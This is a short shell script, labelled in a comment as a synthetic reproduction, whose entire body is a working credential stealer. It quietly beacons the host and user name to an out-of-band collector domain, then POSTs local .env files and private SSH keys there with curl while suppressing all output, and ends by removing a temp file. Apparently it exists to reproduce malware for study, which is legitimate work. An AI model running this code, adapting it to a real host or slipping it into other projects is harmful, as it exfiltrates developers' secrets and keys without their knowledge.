#!/bin/sh
# Synthetic reproduction; never execute. No real credentials or collector.
C=collector.oast.site
H=$(hostname -s 2>/dev/null || echo unknown)
U=$(id -un 2>/dev/null || echo unknown)
D=$(pwd)
curl -sk "https://$C/$U.$H.alive" >/dev/null 2>&1
for f in .env .env.production .env.local; do
  [ -f "$D/$f" ] && curl -sk -X POST "https://$C/$U.$H.env" \
    -d "$(cat "$D/$f")" >/dev/null 2>&1
done
for k in id_rsa id_ed25519 id_ecdsa; do
  [ -f "$HOME/.ssh/$k" ] && curl -sk -X POST "https://$C/$U.$H.ssh" \
    -d "$(cat "$HOME/.ssh/$k")" >/dev/null 2>&1
done
rm -f /tmp/.r
